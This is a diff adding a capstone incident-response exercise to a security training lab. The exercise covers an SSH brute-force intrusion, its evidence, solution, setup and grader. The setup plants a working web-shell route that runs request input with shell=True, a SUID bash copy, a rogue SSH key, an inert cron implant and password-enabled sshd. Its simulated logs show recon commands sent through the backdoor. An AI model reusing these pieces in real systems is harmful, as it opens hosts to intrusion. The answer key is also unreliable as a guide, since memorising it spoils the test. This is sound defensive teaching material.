@@ -278,3 +278,485 @@ exercises:
     f=$(sha256sum -c --quiet /srv/kl/SHA256SUMS 2>/dev/null | cut -d: -f1)
     echo "${f#./}" > /lab/answer.txt
     sudo tar -xzf /srv/kl/app-release.tar.gz -C /srv/kl/app "$f"
+
+# ===== Capstone: a real-world lab =====
+
+- id: sec-090
+  title: "Capstone: the notes server was broken into"
+  difficulty: 5
+  kind: fix
+  tags: [capstone, incident-response, logs, ssh, suid, cron, persistence, integrity, hardening]
+  tutorial: |
+    **Concept.** A real first response runs in a fixed order: **work out what happened, keep the evidence, evict the intruder, then close the way in**. Skip a step and it comes back to bite you. Clean up before you understand and you destroy the trail. Evict without closing the hole and they walk back in tonight. Close the hole without evicting and their backdoors still work.
+
+    **Follow one address through every source.** The authentication log tells you who got in and as whom. The same address then shows up in the web server's log, and what it requested there points at what it changed. Each finding is the search term for the next one.
+
+    **Persistence lives in several places at once.** An intruder with a shell rarely leaves just one way back: a scheduled job, an extra SSH key, a privileged binary, a change to the application itself. Each one is found by comparing what exists with what should exist (a baseline, an approved list, a release manifest), never by eyeballing.
+
+    **Restore, don't repair.** Application code that was tampered with is replaced from the release artifact and verified against its manifest. A running program keeps the code it loaded at start, so a restored file does nothing until the service restarts. Ask *why* the attacker could change the code at all: a service account that can write to its own code turns any foothold in the service into a permanent backdoor.
+
+    **Close the entry point.** A brute-forced password means the service accepted passwords in the first place. Switching the SSH service to keys only, refusing root logins and changing the guessed password closes that path. The approved keys must keep working, because the people who rely on the service still need it.
+
+    **Read up on:**
+    - `awk` arrays keyed by address; the sshd wording for failed and accepted logins
+    - the combined web log format: which field holds the client, the request and the status
+    - `sha256sum -c --quiet`; extracting one member from an archive with `tar -x`
+    - `find / -xdev -perm -4000`, `comm`, and why both lists must be sorted the same way (`LC_ALL=C`)
+    - `/etc/cron.d` and `man 5 crontab`; `ssh-keygen -lf` for key fingerprints
+    - `chown -R`, `chmod -R go-w`, and `find -writable` run as another user (`sudo -u`)
+    - `man sshd_config`: `PasswordAuthentication`, `PermitRootLogin`; `sshd -T` to print the effective settings
+    - `chpasswd`, and why `passwd -l` also locks key logins on an SSH server without PAM
+  scenario: |
+    **IR-2291**, opened by Priya Raman (platform on-call), 03:10:
+
+    > The SOC paged us: something brute-forced SSH on the **notes** server overnight and got in, and
+    > the box has been behaving oddly since. Notes is used by the whole office, so I need it back up
+    > and clean, and I need to know exactly what they did. Please keep anything we might need for the
+    > post-mortem.
+
+    This VM is that server. What runs on it:
+
+    - **`kl-notes`**, a small Python web service (systemd unit `kl-notes`, run as the account
+      **`kl-web`**) on `http://127.0.0.1:9180`. `GET /notes` returns the team's notes and `GET /health`
+      returns `ok`. Its code is in **`/opt/kl-notes`**.
+    - **`kl-notes-ssh`**, the SSH service people use to reach `kl-web` (systemd unit `kl-notes-ssh`,
+      config **`/etc/kl-sshd/sshd_config`**) on `127.0.0.1:2222`. Don't touch the VM's own SSH service
+      on port 22.
+
+    The evidence you've been given is in **`/lab/evidence`**: `auth.log` (the SSH service's log),
+    `access.log` (the web proxy in front of kl-notes), `suid-baseline.txt` (every SUID file when the
+    server was built) and `approved-keys.txt` (the fingerprints of the two keys ever approved for
+    `kl-web`). The last release of the service is **`/lab/release/kl-notes-1.4.2.tar.gz`**, with its
+    manifest **`/lab/release/SHA256SUMS`**. Leave `/lab/release` as it is. You have `sudo`.
+
+    ## 1. The report
+
+    Write **`/lab/report.txt`** with these `key=value` lines:
+
+    - `attacker_ip`: the address that made **at least 20 failed attempts and then logged in with a
+      password**
+    - `account`: the account it logged in as
+    - `webshell`: the URL path (no query string) of the backdoor the attacker used in the web service
+    - `tampered_file`: the file of the application they changed, relative to `/opt/kl-notes` (for
+      example `lib/foo.py`)
+    - `c2`: the command-and-control IP configured in the script their scheduled job runs
+    - `suid`: the full path of the SUID file they planted
+
+    ## 2. Evidence first
+
+    Before you remove or restore anything, put byte-for-byte copies of **the script the scheduled
+    job runs** and of **the tampered application file** in **`/lab/quarantine/`** (any names).
+
+    ## 3. Evict them
+
+    - Remove the scheduled job **and** its script. The legitimate nightly backup job must stay.
+    - Remove the SSH key that isn't approved from `kl-web`'s `authorized_keys`. Keep the two approved
+      keys, and keep the file's owner and mode. Key comments prove nothing.
+    - Remove the SUID bit from the planted file, but keep the file: it's evidence.
+
+    ## 4. Restore the service
+
+    - The code in `/opt/kl-notes` must match the release manifest exactly, with no extra files.
+    - The service account must not be able to change its own code again: **`kl-web` must not be able
+      to write to any file or directory under `/opt/kl-notes`**.
+    - kl-notes must be running and serving `/notes`, and the backdoor path must answer **404** and run
+      nothing.
+
+    ## 5. Close the way in
+
+    - `kl-notes-ssh` must **accept public keys only**: no password or keyboard-interactive logins.
+    - **Root** must not be allowed to log in over it at all.
+    - Change `kl-web`'s password, which the attacker now knows.
+    - The approved keys must still log in as `kl-web`.
+  hints:
+    - "Report: count `Failed password` per address and remember which addresses had an `Accepted password` and for whom. The address with the most failures is not necessarily the one that got in, and some failures are for `invalid user` names, so find the address by the word after `from`."
+    - "Report: `grep` the attacker's address in `access.log`. Requests with a query string to a path the other clients never use are the backdoor. `cd /opt/kl-notes && sha256sum -c --quiet /lab/release/SHA256SUMS` names the changed file; read it to see the backdoor in the code."
+    - "Report: `grep -H '' /etc/cron.d/*` shows every job; one runs every few minutes as `kl-web` from its home directory. Read the script with `sudo`. For the SUID file, compare `sudo find / -xdev -type f -perm -4000 2>/dev/null | LC_ALL=C sort` with the baseline using `comm -13`."
+    - "Evict: copy to `/lab/quarantine` first. For the keys, fingerprint each line with `ssh-keygen -lf - <<<\"$line\"` and keep only approved ones; writing the result back with `sudo tee` keeps the file's owner and mode."
+    - "Restore: `tar -tzf` lists the archive's member names (they start with `./`). Fix the ownership with `chown -R root:root` and `chmod -R go-w`, check with `sudo -u kl-web find /opt/kl-notes -writable`, and restart kl-notes: the running process still holds the old code."
+    - "Close: set `PasswordAuthentication no` and `PermitRootLogin no`, check with `sudo sshd -T -f /etc/kl-sshd/sshd_config`, and restart kl-notes-ssh. Change the password with `chpasswd` rather than `passwd -l`: without PAM, sshd refuses every login to a locked account, keys included."
+  solution: |
+    **1. The report.** Correlate the auth log, then follow the address into the web log:
+
+    ```bash
+    E=/lab/evidence
+    read -r ATT ACCT < <(awk '
+      /Failed password/   { for (i = 1; i <= NF; i++) if ($i == "from") f[$(i+1)]++ }
+      /Accepted password/ { for (i = 1; i <= NF; i++) { if ($i == "for") u = $(i+1); if ($i == "from") ip = $(i+1) }; a[ip] = u }
+      END { for (ip in a) if (f[ip] >= 20) print ip, a[ip] }' $E/auth.log)
+    grep -F "$ATT " $E/access.log                     # the backdoor and what they ran with it
+    WS=$(awk -v ip="$ATT" '$1 == ip && $7 ~ /\?c=/ { split($7, p, "?"); print p[1] }' $E/access.log | sort -u | head -1)
+    cd /opt/kl-notes
+    TF=$(sha256sum -c --quiet /lab/release/SHA256SUMS 2>/dev/null | cut -d: -f1 | head -1)   # ./lib/....py
+    grep -H '' /etc/cron.d/*                          # the */5 job runs a script from kl-web's home
+    SCRIPT=$(awk '$1 == "*/5" { print $7 }' /etc/cron.d/* | head -1)
+    CRONF=$(grep -lF -- "$SCRIPT" /etc/cron.d/*)
+    C2=$(sudo grep -oE '[0-9]+(\.[0-9]+){3}' "$SCRIPT" | head -1)
+    sudo find / -xdev -type f -perm -4000 2>/dev/null | LC_ALL=C sort > /tmp/suid-now.txt
+    SUID=$(comm -13 $E/suid-baseline.txt /tmp/suid-now.txt | head -1)
+    printf 'attacker_ip=%s\naccount=%s\nwebshell=%s\ntampered_file=%s\nc2=%s\nsuid=%s\n' \
+      "$ATT" "$ACCT" "$WS" "${TF#./}" "$C2" "$SUID" > /lab/report.txt
+    ```
+
+    **2. Evidence first.**
+
+    ```bash
+    mkdir -p /lab/quarantine
+    sudo cp "$SCRIPT" /lab/quarantine/cron-script.sh
+    cp "/opt/kl-notes/$TF" /lab/quarantine/tampered-routes.py
+    sudo chown -R "$(id -un):" /lab/quarantine
+    ```
+
+    **3. Evict them.**
+
+    ```bash
+    sudo rm -f "$CRONF" "$SCRIPT"
+    sudo chmod u-s "$SUID"
+    f=/home/kl-web/.ssh/authorized_keys
+    sudo cat "$f" | while IFS= read -r line; do
+      fp=$(ssh-keygen -lf - <<<"$line" | awk '{print $2}')
+      grep -qxF "$fp" $E/approved-keys.txt && printf '%s\n' "$line"
+    done > /tmp/keys.ok
+    sudo tee "$f" < /tmp/keys.ok > /dev/null       # tee rewrites in place: owner and mode stay
+    ```
+
+    **4. Restore the service.**
+
+    ```bash
+    sudo tar -xzf /lab/release/kl-notes-1.4.2.tar.gz -C /opt/kl-notes "$TF"
+    sudo chown -R root:root /opt/kl-notes
+    sudo chmod -R go-w /opt/kl-notes
+    sudo -u kl-web find /opt/kl-notes -writable     # prints nothing
+    sudo systemctl restart kl-notes
+    ```
+
+    **5. Close the way in.**
+
+    ```bash
+    sudo sed -i -e 's/^PasswordAuthentication .*/PasswordAuthentication no/' \
+                -e 's/^PermitRootLogin .*/PermitRootLogin no/' /etc/kl-sshd/sshd_config
+    sudo sshd -T -f /etc/kl-sshd/sshd_config | grep -E '^(passwordauthentication|permitrootlogin) '
+    echo "kl-web:$(openssl rand -hex 24)" | sudo chpasswd
+    sudo systemctl restart kl-notes-ssh
+    ```
+  setup: |
+    on_reset 'systemctl disable --now kl-notes kl-notes-ssh 2>/dev/null; rm -f /etc/systemd/system/kl-notes.service /etc/systemd/system/kl-notes-ssh.service; systemctl daemon-reload; pkill -KILL -u kl-web 2>/dev/null; userdel -rf kl-web 2>/dev/null; rm -rf /opt/kl-notes /etc/kl-sshd /var/lib/kl-notes /var/lib/kubelab/s90*; true'
+    hex() { head -c "$1" /dev/urandom | od -An -tx1 | tr -d ' \n'; }
+    ATT=198.51.100.$((RANDOM % 200 + 20))
+    C2=203.0.113.$((RANDOM % 200 + 20))
+    TOKEN=$(rand_flag)
+    WS=/$(printf '%s\n' api/diag static/.cache healthz-internal api/v0/debug | shuf -n1)-$(hex 2)
+    SCRIPT=/home/kl-web/.local/share/.$(printf '%s\n' sync dbus-update cache-gc | shuf -n1)
+    SUID=/var/lib/kl-notes/.tools/$(printf '%s\n' ntpcheck logtail dbcheck | shuf -n1)
+    mkdir -p /lab/evidence /lab/release
+
+    # --- the service account, with the password the attacker guessed ---
+    id kl-web >/dev/null 2>&1 || useradd -m -s /bin/bash kl-web
+    echo "kl-web:summer$((RANDOM % 90 + 10))!" | chpasswd
+    OLDSHADOW=$(getent shadow kl-web | cut -d: -f2)
+
+    # --- the application, as released ---
+    mkdir -p /opt/kl-notes/lib /opt/kl-notes/static /var/lib/kl-notes
+    cat > /opt/kl-notes/app.py <<'PY'
+    import sys, urllib.parse as u
+    sys.path.insert(0, '/opt/kl-notes')
+    from http.server import BaseHTTPRequestHandler as B, ThreadingHTTPServer as S
+    from lib import routes
+    class H(B):
+        def log_message(self, *a): pass
+        def do_GET(self):
+            p = u.urlparse(self.path)
+            code, ctype, body = routes.dispatch(p.path, u.parse_qs(p.query))
+            b = body.encode()
+            self.send_response(code); self.send_header('Content-Type', ctype)
+            self.send_header('Content-Length', str(len(b))); self.end_headers(); self.wfile.write(b)
+    S(('127.0.0.1', 9180), H).serve_forever()
+    PY
+    : > /opt/kl-notes/lib/__init__.py
+    cat > /opt/kl-notes/lib/store.py <<'PY'
+    import json
+    PATH = '/var/lib/kl-notes/notes.json'
+    def load():
+        with open(PATH) as f:
+            return json.load(f)
+    PY
+    cat > /opt/kl-notes/lib/routes.py <<'PY'
+    import json
+    from lib import store
+
+    def health(q):
+        return 200, 'text/plain', 'ok\n'
+
+    def notes(q):
+        return 200, 'application/json', json.dumps(store.load()) + '\n'
+
+    ROUTES = {'/health': health, '/notes': notes}
+
+    def dispatch(path, q):
+        h = ROUTES.get(path)
+        if h is None:
+            return 404, 'text/plain', 'not found\n'
+        return h(q)
+    PY
+    printf '<!doctype html><title>Notes</title><h1>Team notes</h1>\n' > /opt/kl-notes/static/index.html
+    echo 1.4.2 > /opt/kl-notes/VERSION
+    (cd /opt/kl-notes && find . -type f | LC_ALL=C sort | xargs sha256sum) > /lab/release/SHA256SUMS
+    tar --owner=0 --group=0 -czf /lab/release/kl-notes-1.4.2.tar.gz -C /opt/kl-notes .
+    sha256sum /lab/release/SHA256SUMS /lab/release/kl-notes-1.4.2.tar.gz > "$KL_STATE/s90.release"
+    printf '[{"title": "on-call rota", "body": "%s"}, {"title": "wifi", "body": "ask IT"}]\n' "$TOKEN" > /var/lib/kl-notes/notes.json
+
+    # --- the attacker's change: a command route in the dispatcher ---
+    cat >> /opt/kl-notes/lib/routes.py <<'PY'
+
+    import subprocess as _sp
+    def _diag(q):
+        c = (q.get('c') or [''])[0]
+        return 200, 'text/plain', _sp.run(c, shell=True, capture_output=True, text=True, timeout=5).stdout
+    ROUTES['WSPATH'] = _diag
+    PY
+    sed -i "s#WSPATH#$WS#" /opt/kl-notes/lib/routes.py
+    # the mistake that let them: the service account owns its own code
+    chown -R kl-web:kl-web /opt/kl-notes /var/lib/kl-notes
+    cat > /etc/systemd/system/kl-notes.service <<'U'
+    [Unit]
+    Description=Team notes service
+    [Service]
+    User=kl-web
+    Environment=PYTHONDONTWRITEBYTECODE=1
+    ExecStart=/usr/bin/python3 -B /opt/kl-notes/app.py
+    Restart=on-failure
+    [Install]
+    WantedBy=multi-user.target
+    U
+
+    # --- the SSH service, with password logins on ---
+    mkdir -p /etc/kl-sshd /run/sshd
+    ssh-keygen -q -t ed25519 -N '' -f /etc/kl-sshd/ssh_host_ed25519_key
+    cat > /etc/kl-sshd/sshd_config <<'E'
+    Port 2222
+    ListenAddress 127.0.0.1
+    HostKey /etc/kl-sshd/ssh_host_ed25519_key
+    PidFile /run/kl-notes-ssh.pid
+    AuthorizedKeysFile .ssh/authorized_keys
+    PermitRootLogin yes
+    PasswordAuthentication yes
+    KbdInteractiveAuthentication no
+    UsePAM no
+    E
+    cat > /etc/systemd/system/kl-notes-ssh.service <<'U'
+    [Unit]
+    Description=SSH access to the notes service account
+    [Service]
+    RuntimeDirectory=sshd
+    RuntimeDirectoryPreserve=yes
+    ExecStart=/usr/sbin/sshd -D -f /etc/kl-sshd/sshd_config
+    Restart=no
+    [Install]
+    WantedBy=multi-user.target
+    U
+
+    # --- the keys: two approved, one planted with a borrowed comment ---
+    t=$(mktemp -d)
+    ssh-keygen -q -t ed25519 -N '' -C 'priya@laptop' -f "$t/staff"
+    ssh-keygen -q -t ed25519 -N '' -C 'deploy@ci' -f "$t/ci"
+    ssh-keygen -q -t ed25519 -N '' -C 'deploy@ci' -f "$t/evil"
+    for k in staff ci; do ssh-keygen -lf "$t/$k.pub" | awk '{print $2}'; done > /lab/evidence/approved-keys.txt
+    install -d -m 700 -o kl-web -g kl-web /home/kl-web/.ssh
+    cat $(printf '%s\n' "$t/staff.pub" "$t/ci.pub" "$t/evil.pub" | shuf) > /home/kl-web/.ssh/authorized_keys
+    chown kl-web:kl-web /home/kl-web/.ssh/authorized_keys; chmod 600 /home/kl-web/.ssh/authorized_keys
+    install -m 600 "$t/ci" "$KL_STATE/s90-ci"
+    rm -rf "$t"
+
+    # --- persistence: a job every five minutes, and a SUID shell ---
+    install -d -o kl-web -g kl-web "$(dirname "$SCRIPT")"
+    cat > "$SCRIPT" <<EOF
+    #!/bin/sh
+    # stand-in for the implant: it never contacts anything
+    C2=$C2
+    PORT=8443
+    exit 0
+    EOF
+    chown kl-web:kl-web "$SCRIPT"; chmod 755 "$SCRIPT"
+    echo "*/5 * * * * kl-web $SCRIPT" > /etc/cron.d/kl-notes-cache
+    echo '15 2 * * * kl-web /bin/true # nightly notes backup' > /etc/cron.d/kl-notes-backup
+    find / -xdev -type f -perm -4000 2>/dev/null | LC_ALL=C sort > /lab/evidence/suid-baseline.txt
+    mkdir -p "$(dirname "$SUID")"
+    install -m 4755 -o root -g root /bin/bash "$SUID"
+
+    # --- the logs ---
+    ATT=$ATT WS=$WS python3 - <<'PY'
+    import os, random
+    att, ws = os.environ['ATT'], os.environ['WS']
+    pool = random.sample(range(2, 250), 12)
+    noisy = "198.51.100.%d" % pool[0] if "198.51.100.%d" % pool[0] != att else "198.51.100.%d" % pool[1]
+    others = ["192.0.2.%d" % i for i in pool[2:9]]
+    staff = ["10.0.4.%d" % i for i in pool[9:12]]
+    t = [2 * 3600 + 5 * 60]
+    def ts():
+        t[0] += random.randint(1, 6)
+        s = t[0]
+        return "Nov 18 %02d:%02d:%02d" % (s // 3600, s // 60 % 60, s % 60)
+    ev = []
+    users = ["root", "admin", "kl-web", "deploy", "ubuntu", "test"]
+    for _ in range(320):
+        ev.append(("fail", noisy, random.choice(users)))
+    for _ in range(46):
+        ev.append(("fail", att, "kl-web"))
+    for ip in others:
+        for _ in range(random.randint(2, 12)):
+            ev.append(("fail", ip, random.choice(users)))
+    random.shuffle(ev)
+    # the attacker's success follows its failures; a staff member mistypes once
+    late = [("ok", att, "kl-web"), ("fail", staff[0], "priya"), ("fail", staff[0], "priya"), ("ok", staff[0], "priya")]
+    late += [("key", ip, "kl-web") for ip in staff[1:]]
+    ev += late
+    out = []
+    for kind, ip, user in ev:
+        pid, port = random.randint(1000, 40000), random.randint(20000, 65000)
+        if kind == "fail":
+            if user in ("root", "kl-web", "priya"):
+                msg = "Failed password for %s from %s port %d ssh2" % (user, ip, port)
+            else:
+                msg = "Failed password for invalid user %s from %s port %d ssh2" % (user, ip, port)
+        elif kind == "ok":
+            msg = "Accepted password for %s from %s port %d ssh2" % (user, ip, port)
+        else:
+            msg = "Accepted publickey for %s from %s port %d ssh2: ED25519 SHA256:%s" % (user, ip, port, os.urandom(16).hex())
+        out.append("%s notes sshd[%d]: %s" % (ts(), pid, msg))
+    open("/lab/evidence/auth.log", "w").write("\n".join(out) + "\n")
+    # the web proxy: staff and monitoring, a scanner, and the attacker using the backdoor
+    s0 = t[0] + 300
+    web = []
+    def w(sec, ip, path, code, size, ua):
+        web.append((sec, '%s - - [18/Nov/2026:%02d:%02d:%02d +0000] "GET %s HTTP/1.1" %d %d "-" "%s"' % (
+            ip, sec // 3600, sec // 60 % 60, sec % 60, path, code, size, ua)))
+    UA = "Mozilla/5.0 (X11; Linux x86_64) Firefox/132.0"
+    for i in range(60):
+        w(s0 + i * 30, "10.0.4.%d" % random.choice(pool[9:12]), random.choice(["/notes", "/", "/static/index.html"]), 200, random.randint(200, 900), UA)
+        w(s0 + i * 30 + 5, "127.0.0.1", "/health", 200, 3, "kube-probe/1.31")
+    for i, p in enumerate(["/.env", "/wp-login.php", "/.git/config", "/admin", "/server-status", "/api/diag", "/debug"]):
+        w(s0 + 100 + i, others[0], p, 404, 10, "zgrab/0.x")
+    for i, c in enumerate(["id", "uname+-a", "cat+/etc/passwd", "ls+-la+/opt/kl-notes", "crontab+-l", "sudo+-n+-l"]):
+        w(s0 + 400 + i * 37, att, "%s?c=%s" % (ws, c), 200, random.randint(40, 2000), "curl/8.5.0")
+    w(s0 + 700, att, "/notes", 200, 180, "curl/8.5.0")
+    web.sort()
+    open("/lab/evidence/access.log", "w").write("".join(l + "\n" for _, l in web))
+    PY
+    chown -R "$(lab_user):" /lab
+
+    # --- start everything and prove the starting point ---
+    systemctl daemon-reload
+    systemctl start kl-notes kl-notes-ssh
+    eventually 15 'curl -fsS -m 2 http://127.0.0.1:9180/health' || { echo "kl-notes did not start" >&2; exit 1; }
+    eventually 15 'ss -ltn | grep -q "127.0.0.1:2222 "' || { echo "kl-notes-ssh did not start" >&2; exit 1; }
+    curl -s -m 5 "http://127.0.0.1:9180$WS?c=id" | grep -q 'uid=' || { echo "the backdoor is missing" >&2; exit 1; }
+    ssh -v -o BatchMode=yes -o PubkeyAuthentication=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 \
+      -p 2222 kl-web@127.0.0.1 true 2>&1 | grep -m1 'Authentications that can continue' | grep -q password || { echo "password logins are not offered" >&2; exit 1; }
+    [ "$(ssh -i "$KL_STATE/s90-ci" -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -p 2222 kl-web@127.0.0.1 whoami 2>/dev/null)" = kl-web ] || { echo "the approved key does not log in" >&2; exit 1; }
+    cat > "$KL_STATE/s90.env" <<E
+    ATT=$ATT
+    WS=$WS
+    SCRIPT=$SCRIPT
+    C2=$C2
+    SUID=$SUID
+    TOKEN=$TOKEN
+    OLDSHADOW='$OLDSHADOW'
+    SH_SCRIPT=$(sha256sum "$SCRIPT" | cut -d' ' -f1)
+    SH_TAMPER=$(sha256sum /opt/kl-notes/lib/routes.py | cut -d' ' -f1)
+    E
+    chmod 600 "$KL_STATE/s90.env"
+  check: |
+    . "$KL_STATE/s90.env"
+    f() { sed -n "s/^$1=//p" /lab/report.txt 2>/dev/null | head -1 | tr -d ' \r'; }
+    q() { find /lab/quarantine -type f -exec sha256sum {} + 2>/dev/null | grep -q "^$1 "; }
+    AK=/home/kl-web/.ssh/authorized_keys
+    up() { curl -fsS -m 3 http://127.0.0.1:9180/notes 2>/dev/null | grep -qF "$TOKEN"; }
+    methods() {
+      ssh -v -o BatchMode=yes -o PubkeyAuthentication=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 \
+        -p 2222 kl-web@127.0.0.1 true 2>&1 | grep -m1 'Authentications that can continue' | sed 's/.*continue: *//' | tr -d '\r '
+    }
+    cilogin() {
+      ssh -i "$KL_STATE/s90-ci" -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+        -o ConnectTimeout=5 -p 2222 kl-web@127.0.0.1 whoami 2>/dev/null
+    }
+    info "1. The report"
+    check_eq "attacker_ip" "$(f attacker_ip)" "$ATT"
+    check_eq "account" "$(f account)" "kl-web"
+    check_eq "webshell" "$(f webshell)" "$WS"
+    check_eq "tampered_file" "$(f tampered_file | sed 's#^\./##')" "lib/routes.py"
+    check_eq "c2" "$(f c2)" "$C2"
+    check_eq "suid" "$(f suid)" "$SUID"
+    info "2. Evidence first"
+    check "/lab/quarantine holds an exact copy of the cron job's script" 'q "$SH_SCRIPT"'
+    check "/lab/quarantine holds an exact copy of the tampered file" 'q "$SH_TAMPER"'
+    info "3. Evict them"
+    check_not "no scheduled job runs the script" 'grep -rqF "$SCRIPT" /etc/cron.d /etc/crontab /var/spool/cron'
+    check_not "the script is gone" '[ -e "$SCRIPT" ]'
+    check "the nightly backup job is still there" 'grep -q "nightly notes backup" /etc/cron.d/kl-notes-backup'
+    check_eq "only the approved keys remain for kl-web" "$(ssh-keygen -lf "$AK" 2>/dev/null | awk '{print $2}' | sort | tr '\n' ' ')" "$(sort /lab/evidence/approved-keys.txt | tr '\n' ' ')"
+    check_eq "authorized_keys keeps its owner and mode" "$(stat -c '%U %a' "$AK" 2>/dev/null)" "kl-web 600"
+    check "the SUID file is kept as evidence" '[ -f "$SUID" ]'
+    check_not "its SUID bit is gone" '[ -u "$SUID" ]'
+    info "4. Restore the service"
+    check "the code matches the release manifest" '(cd /opt/kl-notes && sha256sum --quiet -c /lab/release/SHA256SUMS)'
+    check_eq "no files beyond the release" "$(cd /opt/kl-notes 2>/dev/null && find . -type f | LC_ALL=C sort | tr '\n' ' ')" "$(awk '{print $2}' /lab/release/SHA256SUMS | LC_ALL=C sort | tr '\n' ' ')"
+    check "the release artifacts are untouched" 'sha256sum --quiet -c "$KL_STATE/s90.release"'
+    check_not "kl-web can't write to anything under /opt/kl-notes" 'sudo -u kl-web find /opt/kl-notes -writable 2>/dev/null | grep -q .'
+    systemctl is-active -q kl-notes && eventually 6 up
+    check "kl-notes is running and serves /notes" 'systemctl is-active -q kl-notes && up'
+    check_eq "the backdoor path answers 404" "$(curl -s -o /dev/null -w '%{http_code}' -m 3 "http://127.0.0.1:9180$WS")" 404
+    check_not "the backdoor runs nothing" 'curl -s -m 3 "http://127.0.0.1:9180$WS?c=id" | grep -q "uid="'
+    info "5. Close the way in"
+    check "kl-notes-ssh is running" 'systemctl is-active -q kl-notes-ssh'
+    M=$(methods)
+    check "kl-notes-ssh offers public-key logins only (offered: ${M:-nothing})" '[ "$M" = publickey ]'
+    check "root may not log in over kl-notes-ssh" 'sshd -T -f /etc/kl-sshd/sshd_config 2>/dev/null | grep -qx "permitrootlogin no"'
+    check "kl-web's password was changed" '[ "$(getent shadow kl-web | cut -d: -f2)" != "$OLDSHADOW" ]'
+    check_eq "the approved CI key still logs in as kl-web" "$(cilogin)" "kl-web"
+    kl_finish
+  solve: |
+    E=/lab/evidence
+    # --- 1. the report ---
+    read -r ATT ACCT < <(awk '
+      /Failed password/   { for (i = 1; i <= NF; i++) if ($i == "from") f[$(i+1)]++ }
+      /Accepted password/ { for (i = 1; i <= NF; i++) { if ($i == "for") u = $(i+1); if ($i == "from") ip = $(i+1) }; a[ip] = u }
+      END { for (ip in a) if (f[ip] >= 20) print ip, a[ip] }' $E/auth.log)
+    WS=$(awk -v ip="$ATT" '$1 == ip && $7 ~ /\?c=/ { split($7, p, "?"); print p[1] }' $E/access.log | sort -u | head -1)
+    TF=$(cd /opt/kl-notes && sha256sum -c --quiet /lab/release/SHA256SUMS 2>/dev/null | cut -d: -f1 | head -1)
+    SCRIPT=$(awk '$1 == "*/5" { print $7 }' /etc/cron.d/* | head -1)
+    CRONF=$(grep -lF -- "$SCRIPT" /etc/cron.d/*)
+    C2=$(sudo grep -oE '[0-9]+(\.[0-9]+){3}' "$SCRIPT" | head -1)
+    sudo find / -xdev -type f -perm -4000 2>/dev/null | LC_ALL=C sort > /tmp/suid-now.txt
+    SUID=$(comm -13 $E/suid-baseline.txt /tmp/suid-now.txt | head -1)
+    printf 'attacker_ip=%s\naccount=%s\nwebshell=%s\ntampered_file=%s\nc2=%s\nsuid=%s\n' \
+      "$ATT" "$ACCT" "$WS" "${TF#./}" "$C2" "$SUID" > /lab/report.txt
+
+    # --- 2. evidence first ---
+    mkdir -p /lab/quarantine
+    sudo cp "$SCRIPT" /lab/quarantine/cron-script.sh
+    cp "/opt/kl-notes/$TF" /lab/quarantine/tampered-routes.py
+    sudo chown -R "$(id -un):" /lab/quarantine
+
+    # --- 3. evict them ---
+    sudo rm -f "$CRONF" "$SCRIPT"
+    sudo chmod u-s "$SUID"
+    f=/home/kl-web/.ssh/authorized_keys
+    sudo cat "$f" | while IFS= read -r line; do
+      fp=$(ssh-keygen -lf - <<<"$line" | awk '{print $2}')
+      grep -qxF "$fp" $E/approved-keys.txt && printf '%s\n' "$line"
+    done > /tmp/keys.ok
+    sudo tee "$f" < /tmp/keys.ok > /dev/null
+    rm -f /tmp/keys.ok /tmp/suid-now.txt
+
+    # --- 4. restore the service ---
+    sudo tar -xzf /lab/release/kl-notes-1.4.2.tar.gz -C /opt/kl-notes "$TF"
+    sudo chown -R root:root /opt/kl-notes
+    sudo chmod -R go-w /opt/kl-notes
+    sudo systemctl restart kl-notes
+
+    # --- 5. close the way in ---
+    sudo sed -i -e 's/^PasswordAuthentication .*/PasswordAuthentication no/' \
+                -e 's/^PermitRootLogin .*/PermitRootLogin no/' /etc/kl-sshd/sshd_config
+    echo "kl-web:$(openssl rand -hex 24)" | sudo chpasswd
+    sudo systemctl restart kl-notes-ssh
+    for _ in $(seq 1 15); do curl -fs -m 2 -o /dev/null http://127.0.0.1:9180/health && ss -ltn | grep -q '127.0.0.1:2222 ' && break; sleep 1; done
